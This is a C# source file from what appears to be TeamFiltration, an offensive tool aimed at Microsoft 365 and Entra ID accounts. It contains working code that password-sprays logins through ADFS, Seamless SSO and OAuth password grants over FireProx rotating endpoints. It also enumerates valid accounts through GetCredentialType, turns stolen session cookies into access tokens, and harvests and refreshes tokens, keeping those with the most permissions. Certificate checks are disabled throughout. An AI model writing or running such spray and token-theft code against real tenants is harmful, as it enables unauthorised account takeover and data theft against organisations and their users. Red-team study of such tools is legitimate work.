using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Authentication;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using TeamFiltration.Models.MSOL;
using TeamFiltration.Models.TeamFiltration;
using TeamFiltration.Helpers;
using static TeamFiltration.Modules.Spray;
using System.Web;
using System.IdentityModel.Tokens.Jwt;
using System.Net.Http.Headers;
using System.Xml.Linq;
using System.Data.SqlTypes;
using System.IO;
using System.Xml.Serialization;

namespace TeamFiltration.Handlers
{
    class MSOLHandler
    {
        public static GlobalArgumentsHandler _globalProperties { get; set; }
        public static string _moduleName { get; set; }
        public static bool _debugMode { get; set; }
        public static DatabaseHandler _databaseHandler { get; set; }
        public MSOLHandler(GlobalArgumentsHandler globalProperties, string module, DatabaseHandler databaseHandler)
        {
            _globalProperties = globalProperties;
            _moduleName = module;
            _databaseHandler = databaseHandler;
            _debugMode = globalProperties.DebugMode;
        }


        public async Task<GetOpenIdConfigResp> GetOpenIdConfig(string domain)
        {
            string url = $"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration";

            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };


            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode,
                AllowAutoRedirect = false
            };



            var openIdHttpClient = new HttpClient(httpClientHandler);

            openIdHttpClient.DefaultRequestHeaders.Add("Accept", "application/json");
            openIdHttpClient.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);

            //Add some error handling here
            var httpResp = await openIdHttpClient.GetAsync(url);
            if (httpResp.IsSuccessStatusCode)
            {
                string stringContent = await httpResp.Content.ReadAsStringAsync();
                var getOpenIdConfigRespObject = JsonConvert.DeserializeObject<GetOpenIdConfigResp>(stringContent);
                return getOpenIdConfigRespObject;
            }
            //  var httpResp = await openIdHttpClient.PostAsync(url, loginPostBody);

            return null;

        }

        public async Task<Envelope> GetOutlookAutodiscover(string domain)
        {

            string url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc";
            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode,
                AllowAutoRedirect = true
            };

            var getAutodiscoverClient = new HttpClient(httpClientHandler);

            string xmlData = $@"<?xml version=""1.0"" encoding=""utf-8""?>
        <soap:Envelope xmlns:exm=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:ext=""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:a=""http://www.w3.org/2005/08/addressing"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
	        <soap:Header>
		        <a:Action soap:mustUnderstand=""1"">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation</a:Action>
		        <a:To soap:mustUnderstand=""1"">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc</a:To>
		        <a:ReplyTo>
			        <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
		        </a:ReplyTo>
	        </soap:Header>
	        <soap:Body>
		        <GetFederationInformationRequestMessage xmlns=""http://schemas.microsoft.com/exchange/2010/Autodiscover"">
			        <Request>
				        <Domain>{domain}</Domain>
			        </Request>
		        </GetFederationInformationRequestMessage>
	        </soap:Body>
        </soap:Envelope>";


            getAutodiscoverClient.DefaultRequestHeaders.Add("User-Agent", "AutodiscoverClient");

            Envelope envelope = null;
            var xmlBody = new StringContent(xmlData, Encoding.UTF8, "text/xml");
            HttpResponseMessage httpResp = await getAutodiscoverClient.PostAsync(url, xmlBody);
            string contentResp = await httpResp.Content.ReadAsStringAsync();

            XmlSerializer serializer = new XmlSerializer(typeof(Envelope), new XmlRootAttribute("Envelope") { Namespace = "http://schemas.xmlsoap.org/soap/envelope/" });
            using (StringReader stringReader = new StringReader(contentResp))
            {
                envelope = (Envelope)serializer.Deserialize(stringReader);

            }

            return envelope;

        }

        public async Task<UserRealmLoginResp> GetUserRealm(string email)
        {
            string url = $"https://login.microsoftonline.com/GetUserRealm.srf?login={email}";

            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };


            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode,
                AllowAutoRedirect = false
            };



            var openIdHttpClient = new HttpClient(httpClientHandler);

            openIdHttpClient.DefaultRequestHeaders.Add("Accept", "application/json");
            openIdHttpClient.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);

            //Add some error handling here
            var httpResp = await openIdHttpClient.GetAsync(url);
            if (httpResp.IsSuccessStatusCode)
            {
                string userRealmLoginRespContent = await httpResp.Content.ReadAsStringAsync();
                var userRealmLoginRespObject = JsonConvert.DeserializeObject<UserRealmLoginResp>(userRealmLoginRespContent);
                return userRealmLoginRespObject;
            }
            //  var httpResp = await openIdHttpClient.PostAsync(url, loginPostBody);

            return null;
        }


        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> LoginSprayAttempt(SprayAttempt sprayAttempts, UserRealmResp userRealmResp)
        {
            #region burp debug
            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,


            };


            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode,
                AllowAutoRedirect = userRealmResp.Adfs ? false : true
            };
            #endregion


            var client = new HttpClient(httpClientHandler);
            BearerTokenResp tokenResp = null;
            BearerTokenErrorResp errorResp = null;

            //If we are spraying a NON adfs customer

            if (sprayAttempts.AADSSO)
            {
                var errorMsg = "ADF1337: Invalid password or username";
                var domain = sprayAttempts.Username.Split("@")[1];
                //Implement the new method
                var aadSsoUrl = $"{sprayAttempts.FireProxURL}/{domain}/winauth/trust/2005/usernamemixed?client-request-id={Guid.NewGuid()}";
                var created = DateTime.Now.ToUniversalTime().ToString("o");
                var expires = DateTime.Now.AddMinutes(13).ToUniversalTime().ToString("o");

                var xmlData = $@"<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>{aadSsoUrl}</wsa:To>
        <wsa:MessageID>urn:uuid:{Guid.NewGuid().ToString()}</wsa:MessageID>
        <wsse:Security s:mustUnderstand=""1"">
            <wsu:Timestamp wsu:Id=""_0"">
                <wsu:Created>{created}</wsu:Created>
                <wsu:Expires>{expires}</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id=""uuid-{Guid.NewGuid().ToString()}"">
                <wsse:Username>{sprayAttempts.Username}</wsse:Username>
                <wsse:Password>{sprayAttempts.Password}</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>";

                client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);


                var xmlBody = new StringContent(xmlData, Encoding.UTF8, "text/xml");
                HttpResponseMessage httpResp = await client.PostAsync(aadSsoUrl, xmlBody);
                string contentResp = await httpResp.Content.ReadAsStringAsync();


                if (httpResp.StatusCode.Equals(HttpStatusCode.BadRequest))
                {
                    try
                    {
                        errorMsg = contentResp.Split("</psf:code><psf:text>")[1].Split("<")[0];
                    }
                    catch (Exception)
                    {

                    }



                }

                if (httpResp.StatusCode.Equals(HttpStatusCode.OK))
                    tokenResp = new BearerTokenResp()
                    {
                        access_token = "Dummy_Data_Whike_Debugging_ADFS",
                        expires_on = "1337",
                        ext_expires_in = "1337",
                        expires_in = "1337",
                        refresh_token = "Dummy_Data_Whike_Debugging_ADFS",
                        resource = "bad.bad.com"
                    };
                // JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);

                else
                    errorResp = new BearerTokenErrorResp()
                    { error_description = (string.IsNullOrEmpty(errorMsg)) ? "ADFXXXX: Invalid password or username" : errorMsg };// JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);
            }


            if (userRealmResp.Adfs && !sprayAttempts.AADSSO)
            {
                int retyRequest = 0;
            adfsRetry:
                var loginPostBody = new FormUrlEncodedContent(new[]
                  {

                    new KeyValuePair<string, string>("UserName", sprayAttempts.Username),
                    new KeyValuePair<string, string>("Password", sprayAttempts.Password),
                    new KeyValuePair<string, string>("AuthMethod", "FormsAuthentication"),

                });

                Uri adfsUrl = new Uri(sprayAttempts.FireProxURL);

                string queryString = adfsUrl.Query;

                client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);
                //client-request-id={Guid.NewGuid().ToString()}

                // Parse the query string into a dictionary of key-value pairs
                var queryParams = HttpUtility.ParseQueryString(queryString);

                // Update the "username" parameter with the given email address
                queryParams.Set("username", sprayAttempts.Username);

                UriBuilder builder = new UriBuilder(adfsUrl);
                builder.Query = queryParams.ToString();


                HttpResponseMessage httpResp = await client.PostAsync(builder.ToString(), loginPostBody);
                string contentResp = await httpResp.Content.ReadAsStringAsync();


                if (httpResp.IsSuccessStatusCode)
                {
                    Regex regex = new Regex(@"<div id=""error""[^>]*>\s*<span id=""errorText""[^>]*>\s*(.*?)\s*</span>\s*</div>");
                    Match match = regex.Match(contentResp);

                    if (match.Success)
                    {
                        string errorMessage = match.Groups[1].Value;
                        errorResp = new BearerTokenErrorResp()
                        { error_description = errorMessage };
                    }
                    else
                    {
                        //Let's fake this so it's easy to return
                        errorResp = new BearerTokenErrorResp()
                        { error_description = "AADSTS50126: Invalid password or username", error = "AADSTS50126" };
                    }


                }
                else
                {
                    //We got a Succsessfull login
                    httpResp.Headers.TryGetValues("Set-Cookie", out var setCookies);

                    if (setCookies != null)
                    {
                        if (setCookies.Where(x => x.Contains("MSISAuth=")).Any())
                            tokenResp = new BearerTokenResp()
                            {
                                access_token = setCookies.Where(x => x.Contains("MSISAuth=")).FirstOrDefault().Split("=")[1]
                            };

                    }
                    else
                    {
                        if (httpResp.StatusCode == HttpStatusCode.GatewayTimeout && retyRequest < 3)
                        {
                            retyRequest++;
                            goto adfsRetry;
                        }

                        errorResp = new BearerTokenErrorResp()
                        { error_description = $"ADF1337: Uknown error response (HTTP STATUS: {httpResp.StatusCode})" };
                    }
                }

            }
            if (!userRealmResp.Adfs && !sprayAttempts.AADSSO)
            {
                var loginPostBody = new FormUrlEncodedContent(new[]
               {
                new KeyValuePair<string, string>("resource", sprayAttempts.ResourceUri),
                new KeyValuePair<string, string>("client_id",  sprayAttempts.ResourceClientId),
                new KeyValuePair<string, string>("client_info", "1"),
                new KeyValuePair<string, string>("grant_type", "password"),
                new KeyValuePair<string, string>("username", sprayAttempts.Username),
                new KeyValuePair<string, string>("password", sprayAttempts.Password),
                new KeyValuePair<string, string>("scope", "openid")  });

                client.DefaultRequestHeaders.Add("Accept", "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);


                HttpResponseMessage httpResp = await client.PostAsync(sprayAttempts.FireProxURL, loginPostBody);
                string contentResp = await httpResp.Content.ReadAsStringAsync();


                if (httpResp.IsSuccessStatusCode)
                    tokenResp = JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);
                else
                    errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);

            }

            return (tokenResp, errorResp);
        }





        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> CookieGetAccessToken(string tenantId, string username,
            string cookieData, string baseUrl = "https://login.microsoftonline.com", string targetResource = "https://legitcorpnet-my.sharepoint.com", string clientId = "5e3ce6c0-2b1f-4285-8d4b-75ee78787346", bool checkCache = true)
        {
            //TODO: We need to find a way way way better way of doing this
            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode,
                UseCookies = false,
                AllowAutoRedirect = false,
            };

            BearerTokenResp tokenRespObject = null;
            BearerTokenErrorResp errorResp = null;

            if (checkCache)
            {
                //Get the username inside the access token
                //string username = Helpers.Generic.GetUsername(bearer.access_token);

                //Query all tokens for this given resource
                List<PulledTokens> tokenQueryList = _databaseHandler.QueryToken(username, targetResource);

                //Filter out the ones that are not valid 
                IEnumerable<PulledTokens> validTokenQueryList = tokenQueryList.Where(x => Helpers.Generic.IsTokenValid(x.ResponseData, x.DateTime));

                if (validTokenQueryList.Count() > 0)
                {
                    //Is the access token valid?
                    var validAccessTokenQuery = validTokenQueryList.Where(x => Helpers.Generic.IsAccessTokenValid(x.ResponseData, x.DateTime));
                    if (validAccessTokenQuery.Count() > 0)
                    {
                        //Get the access token with the most permissions
                        var mostPermissionsKey = validAccessTokenQuery.OrderByDescending(x => ((BearerTokenResp)x).scope.Length).FirstOrDefault();

                        var tokenObject = (BearerTokenResp)mostPermissionsKey;


                        tokenRespObject = tokenObject;
                        return (tokenRespObject, errorResp);
                    }

                }
            }


            var client = new HttpClient(httpClientHandler);

            var url = baseUrl + "/" + tenantId + "/oauth2/v2.0/authorize?response_type=token&scope=" + "https://" + new Uri(targetResource).Host + "//.default openid profile&client_id=" + clientId + "&redirect_uri=https://teams.microsoft.com/go&client_info=1&client-request-id=" + Guid.NewGuid().ToString() + "&windows_api_version=2.0";
            var refreshCookieMsg = new HttpRequestMessage(HttpMethod.Get, url);
            refreshCookieMsg.Headers.Add("Cookie", cookieData);
            refreshCookieMsg.Headers.Add("Accept", "application/json");


            //This must be a browser for Cookie-Single-Sign-on to work, thanks Microsoft...
            refreshCookieMsg.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");


            HttpResponseMessage httpResp = await client.SendAsync(refreshCookieMsg);
            string contentResp = await httpResp.Content.ReadAsStringAsync();



            if (httpResp.StatusCode == HttpStatusCode.Redirect)
            {
                Regex regex = new Regex(@"(access_token=ey[a-zA-Z0-9_=]+)\.([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_\-\+\/=]*)");

                Match oauthAuthorizeConfig = regex.Match(contentResp);

                if (!oauthAuthorizeConfig.Success)
                {
                    Console.WriteLine("[!] Failed to extract access token from the response.");
                    return (null, errorResp);
                }

                var accessTokenString = oauthAuthorizeConfig.Value;

                var decodedAccessTokenString = HttpUtility.UrlDecode(accessTokenString);
                var parsedAccessToken = HttpUtility.ParseQueryString(decodedAccessTokenString);
                var accessToken = parsedAccessToken.Get("access_token");

                try
                {


                    JwtSecurityToken jwtToken = Helpers.Generic.GetJwtSecurityToken(accessToken);
                    PulledTokens pulledtoken = Helpers.Generic.ParseSingleAccessToken(jwtToken);

                    tokenRespObject = (BearerTokenResp)pulledtoken;

                    Console.WriteLine($"[+] Successfully retrieved an access token for User:{Helpers.Generic.GetUsername(tokenRespObject.access_token)} Resource:{tokenRespObject.resource} using Single-Sign-On");

                    _databaseHandler.WriteToken(pulledtoken);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Failed to parse token, consider looking at the network traffic using Burp and --debug");
                    return (null, errorResp);
                }
            }
            else
                errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);

            return (tokenRespObject, errorResp);
        }

        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> RefreshAttempt(

        BearerTokenResp bearer,
        string url,
        string resURI = "https://outlook.office365.com",
        string clientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
        bool checkCache = true,
        bool print = true,
        string userAgent = "",
        string scope = "openid"
        )
        {
            BearerTokenResp tokenResp = null;
            BearerTokenErrorResp errorResp = null;

            if (string.IsNullOrEmpty(resURI))
            {
                return (tokenResp, errorResp);
            }
            PulledTokens foundRefreshCache = null;
            BearerTokenResp originalbearer = bearer;


            //We wanna check if we already have a valid token for this resource
            if (checkCache)
            {
                //Get the username inside the access token
                string username = Helpers.Generic.GetUsername(bearer.access_token);

                //Query all tokens for this given resource
                List<PulledTokens> tokenQueryList = _databaseHandler.QueryToken(username, resURI);

                //Filter out the ones that are not valid 
                IEnumerable<PulledTokens> validTokenQueryList = tokenQueryList.Where(x => Helpers.Generic.IsTokenValid(x.ResponseData, x.DateTime));

                if (validTokenQueryList.Count() > 0)
                {
                    //Is the access token valid?
                    var validAccessTokenQuery = validTokenQueryList.Where(x => Helpers.Generic.IsAccessTokenValid(x.ResponseData, x.DateTime));
                    if (validAccessTokenQuery.Count() > 0)
                    {
                        //Get the access token with the most permissions
                        var mostPermissionsKey = validAccessTokenQuery.OrderByDescending(x => ((BearerTokenResp)x).scope.Length).FirstOrDefault();

                        var tokenObject = (BearerTokenResp)mostPermissionsKey;

                        if (print)
                            _databaseHandler.WriteLog(new Log(_moduleName, $"Found valid access token in database for => {"https://" + new Uri(resURI).Host}"));
                        tokenResp = tokenObject;
                        return (tokenResp, errorResp);
                    }
                    //If it's not the access token that is valid, it must be the refresh token
                    //Get the refresh token with the most permissions
                    PulledTokens mostPermissionsRefresh = validTokenQueryList.OrderByDescending(x => ((BearerTokenResp)x).scope.Length).FirstOrDefault();
                    bearer = (BearerTokenResp)mostPermissionsRefresh;
                    clientId = mostPermissionsRefresh.ResourceClientId;

                    foundRefreshCache = mostPermissionsRefresh;
                    if (print)
                        _databaseHandler.WriteLog(new Log(_moduleName, $"Found valid refresh token in database for => {"https://" + new Uri(resURI).Host}"));
                }
            }
            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,


            };

            //No point in attempting a refresh if we don't have a refresh token
            if (string.IsNullOrEmpty(bearer.refresh_token))
                return (tokenResp, errorResp);

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode
            };

            using var client = new HttpClient(httpClientHandler);



            var loginPostBody = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("grant_type", "refresh_token"),
                new KeyValuePair<string, string>("refresh_token", bearer.refresh_token),
                new KeyValuePair<string, string>("client_id",  clientId),
                new KeyValuePair<string, string>("resource", "https://" + new Uri(resURI).Host ),
                new KeyValuePair<string, string>("scope", scope),
                new KeyValuePair<string, string>("claims", "{\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}"),



            });


            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("User-Agent", string.IsNullOrEmpty(userAgent) ? _globalProperties.TeamFiltrationConfig.UserAgent : userAgent);

            //Add some error handling here
            var httpResp = await client.PostAsync(url, loginPostBody);
            var contentResp = await httpResp.Content.ReadAsStringAsync();


            if (httpResp.IsSuccessStatusCode)
            {
                if (print)
                    _databaseHandler.WriteLog(new Log(_moduleName, $"Refreshed a token for => {"https://" + new Uri(resURI).Host}"));
                tokenResp = JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);

                _databaseHandler.WriteToken(new PulledTokens()
                {
                    ResponseData = contentResp,
                    ResourceClientId = clientId,
                    ResourceUri = "https://" + new Uri(resURI).Host,
                    Username = Helpers.Generic.GetUsername(tokenResp.access_token)
                });

            }
            else
            {
                var attempDecode = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);
                if (print)
                {
                    if (string.IsNullOrEmpty(attempDecode?.error_description))
                        _databaseHandler.WriteLog(new Log(_moduleName, $"Failed to get token for => {"https://" + new Uri(resURI).Host} HTTPStatusCode {httpResp.StatusCode}"));
                    else
                        _databaseHandler.WriteLog(new Log(_moduleName, $"Failed to get token for => {"https://" + new Uri(resURI).Host} AAD CODE: {attempDecode.error_description.Split(":")[0]}"));
                }

                //check if token has invalid grant / expired
                //Check if it failed
                if (attempDecode != null && foundRefreshCache != null)
                {
                    //Check if the token has been revoked / invalid grant
                    if (attempDecode.error.Equals("invalid_grant"))
                        //If revoked, we have no need for it, remove it
                        //TODO: Instead of removing, maybe mark as revoked? We might wanna keep for later
                        if (_databaseHandler.DeleteToken(foundRefreshCache))
                        {
                            _databaseHandler.WriteLog(new Log("EXFIL", $"Removing revoked token for resource {foundRefreshCache.ResourceUri}", "") { }, true);
                            //Attempt one more time but use the original bearer token
                            await RefreshAttempt(originalbearer, url, resURI, clientId, false, true, userAgent);
                        }
                }


                errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);
            }

            return (tokenResp, errorResp);
        }

        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> LoginAttemptFireProx(string username, string password, string url, (string Uri, string clientId) randomO365Res, bool print = true, string userAgent = "")
        {
            if (string.IsNullOrEmpty(userAgent))
                userAgent = _globalProperties.TeamFiltrationConfig.UserAgent;

            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode
            };



            using var client = new HttpClient(httpClientHandler);
            var loginPostBody = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("resource", randomO365Res.Uri),
                new KeyValuePair<string, string>("client_id",  randomO365Res.clientId),
                new KeyValuePair<string, string>("client_info", "1"),
                new KeyValuePair<string, string>("grant_type", "password"),
                new KeyValuePair<string, string>("username", username),
                new KeyValuePair<string, string>("password", password),
                new KeyValuePair<string, string>("scope", "openid")


            });

            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("User-Agent", userAgent);


            HttpResponseMessage httpResp = await client.PostAsync(url, loginPostBody);
            string contentResp = await httpResp.Content.ReadAsStringAsync();

            BearerTokenResp tokenResp = null;
            BearerTokenErrorResp errorResp = null;

            if (httpResp.IsSuccessStatusCode)
            {
                tokenResp = JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);
                _databaseHandler.WriteToken(new PulledTokens()
                {
                    ResponseData = contentResp,
                    ResourceClientId = randomO365Res.clientId,
                    ResourceUri = randomO365Res.Uri,
                    Username = Helpers.Generic.GetUsername(tokenResp.access_token)
                });
            }
            else
                errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);

            return (tokenResp, errorResp);
        }

        public async Task<bool> ValidateO365Account(string username, string url, bool print = false, bool redo = true)
        {

            int redoCount = 0;

        Start:


            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode
            };

            using (var clientHttp = new HttpClient(httpClientHandler))
            {

                GetCredentialType getCredTypeJson = new GetCredentialType()
                {
                    username = username,
                    isOtherIdpSupported = true,
                    checkPhones = false,
                    isRemoteNGCSupported = true,
                    isCookieBannerShown = false,
                    isFidoSupported = true,
                    originalRequest = "",
                    country = "US",
                    forceotclogin = false,
                    isExternalFederationDisallowed = false,
                    isRemoteConnectSupported = false,
                    federationFlags = 0,
                    isSignup = false,
                    flowToken = "",
                    isAccessPassSupported = true

                };

                var postAsyncReq = await clientHttp.PostAsync(url, new StringContent(JsonConvert.SerializeObject(getCredTypeJson), Encoding.UTF8, "application/json"));

                if (postAsyncReq.IsSuccessStatusCode)
                {
                    var postAsyncResp = await postAsyncReq.Content.ReadAsStringAsync();
                    var postRespObject = JsonConvert.DeserializeObject<GetCredentialTypeResp>(postAsyncResp);

                    if (postRespObject.ThrottleStatus == 0)
                    {
                        if (postRespObject.IfExistsResult == 0 && postRespObject.EstsProperties?.UserTenantBranding != null && postRespObject.EstsProperties.DomainType == 3)
                            return true;
                    }
                    else
                    {
                        if (redo)
                        {
                            redoCount++;
                            if (redoCount < 5)
                                goto Start;
                        }

                    }
                }
            }

            return false;

        }


    }
}
